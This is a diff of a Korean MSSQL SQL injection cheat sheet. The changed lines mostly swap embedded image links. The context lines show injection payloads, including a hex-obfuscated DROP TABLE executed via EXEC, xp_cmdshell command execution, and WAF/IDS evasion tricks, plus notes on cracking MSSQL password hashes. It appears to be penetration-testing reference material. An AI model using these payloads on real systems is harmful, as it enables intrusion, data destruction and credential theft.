@@ -46,7 +46,8 @@ MSSQL 버전이 2008 인 경우 참임.<br>
 
 ## (4) 데이터베이스 자격 증명
 
-<img src="https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0f5cfc77-20ee-466b-84b9-2a736a648d76" />
+<img src="![image](https://github.com/what0302/what0302.github.io/assets/18510716/611f83cc-8e26-4fc3-b845-fdad5fe6dd7f)
+" />
 <br><br>
 예 :<br>
 현재 사용자 반환 :<br>
@@ -57,7 +58,8 @@ MSSQL 버전이 2008 인 경우 참임.<br>
 
 
 ## (5) 데이터베이스 이름
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0a77393f-3fa0-494f-8b55-0e7443bcc915)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/eae34468-cf01-40f8-88f9-3f0fdb387c0c)
+
 <br><br>
 예 :<br>
 `SELECT DB_NAME(5);`<br>
@@ -66,7 +68,8 @@ MSSQL 버전이 2008 인 경우 참임.<br>
 
 
 ## (6) 서버 호스트 이름
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/0b7a9612-d675-4a05-a4ad-d0f3dd191e50)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/33e8390b-f86f-43f9-8f7f-25fd68dcd9f0)
+
 <br><br>
 예 :<br>
 `SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');`<br><br>
@@ -168,7 +171,8 @@ Xtype = 'U' 는 사용자 정의 테이블임. 뷰에서는 'V' 를 사용할 �
 
 더 쉬운 방법은 MSSQL 2005 이상부터 시작됨.<br>
 XML PATH() 함수는 하나의 쿼리로 모든 테이블을 검색할 수 있도록 연결자로 작동함.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/48b93152-4f29-4b3c-a852-96a1adb085b6)<br><br>
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/0e45144f-b8a1-44ee-b6b9-e4ddced1207d)
+<br><br>
 노트 :<br>
 쿼리를 16진수로 인코딩하여 공격을 난독화할 수 있음.<br>
 `' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--`<br><br><br>
@@ -190,7 +194,8 @@ SELECT 'a'+'d'+'mi'+'n';`<br><br><br>
 
 
 ## (10) 조건문
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/5a01a082-5220-43b7-912c-a9c3895ce90a)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/bbca4bbf-026d-4abb-a20f-23bd1df81493)
+
 <br><br>
 예 :<br>
 `IF 1=1 SELECT 'true' ELSE SELECT 'false';`<br>
@@ -222,13 +227,16 @@ IF 는 SELEC 문 내에서 사용할 수 없음.<br><br><br>
 `EXEC master.dbo.xp_cmdshell 'cmd';`<br><br>
 
 MSSQL 2005 이상 버전부터 xp_cmdshell 은 기본적으로 비활성화되어 있지만 다음 쿼리를 사용하여 활성화시킬 수 있음.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/b230fab6-eab5-4eae-80a5-c4d30514cf24)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/fcd2f245-ca17-4b75-857e-1fb4f42a6c39)
+
 <br><br>
 또는, 동일한 결과를 얻기 위해 자체 프로시저를 만들 수 있음.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fa3e8b41-f145-4f4c-9df9-79b56d864eb1)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/ba00bc9b-5cd5-416c-a611-51d43dfac874)
+
 <br><br>
 SQL 버전이 2000 보다 높으면 이전 명령을 실행하기 위해 추가 쿼리를 실행해야 함.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e23a453d-167c-4bb9-ba4f-6e491be594aa)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/fb820e30-08af-44a3-99c5-1a6b2758203e)
+
 <br><br>
 예 :<br>
 `xp_cmdshell 이 로드되어 활성화되어 있는지 확인한 다음 dir 명령어를 실행하여 그 결과값을 TMP_DB에 삽입함 :`<br>
@@ -271,7 +279,8 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 **① 허용된 중간 문자열**<br><br>
 
 다음 문자는 공백으로 사용할 수 있음.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e13ddea1-c1e7-467d-8af2-b202f959bb09)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/5d43f7d1-7139-4930-b01c-571001cdd76c)
+
 <br><br>
 예 :<br>
 `S%E%L%E%C%T%01column%02FROM%03table;`<br>
@@ -281,14 +290,16 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 키워드 간 백분율 기호는 ASP(X) 웹 응용 프로그램에서만 가능함.<br><br>
 
 공백을 사용하지 않으려면 다음 문자를 사용할 수도 있음.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/edbdba4d-6028-4735-9ff4-ce381ef558a4)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/35ec7073-601b-463c-a87c-3fc95e48ea69)
+
 <br><br>
 예 :<br>
 `UNION(SELECT(column)FROM(table));`<br>
 `SELECT"table_name"FROM[information_schema].[tables];`<br><br>
 
 **② AND/OR 뒤에 허용되는 중간 문자열**<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/fbbcb836-a290-43a5-b22d-fa2bebe58b3d)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/a88dba6f-dedd-4e48-9b06-aecb203fb9d7)
+
 <br><br>
 예 :<br>
 `SELECT 1FROM[table]WHERE\1=\1AND\1=\1;`<br><br>
@@ -299,7 +310,8 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 **③ 인코딩**<br><br>
 
 주입을 인코딩하면 WAF/IDS 우회에 유용할 때도 있음.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/72219964-16c4-4aaf-ab4b-0d097aecd1fb)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/3e0a5cd0-abba-43e8-95a1-cc7fc4d59460)
+
 <br><br><br>
 
 
@@ -308,7 +320,8 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 암호는 0x0100 으로 시작하며 0x 다음에 오는 바이트는 첫 번째는 상수임.<br>
 다음 8 바이트는 해시 Salt 이고 나머지 80 바이트는 2 해시임.<br>
 여기서 첫 번째 40 바이트는 암호의 대/소문자를 구분하는 해시이고 두 번째 40 바이트는 대문자 버전임.<br><br>
-![image](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/287aad76-e861-406a-be3d-5aa80bd05adc)
+![image](https://github.com/what0302/what0302.github.io/assets/18510716/c23336c2-199d-40ab-845d-3ac0cac16ff8)
+
 <br><br><br>
 
 
@@ -316,7 +329,7 @@ MSSQL 은 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 ### (18) 패스워드 크랙(Password Cracking)
 
 JTR 용 Metasploit 모듈은 아래 링크에서 찾을 수 있음.<br>
-http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast<br><br>
+[http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast](http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast)<br><br>
 
 **① MSSQL 2000 Password Cracker**<br><br>
 
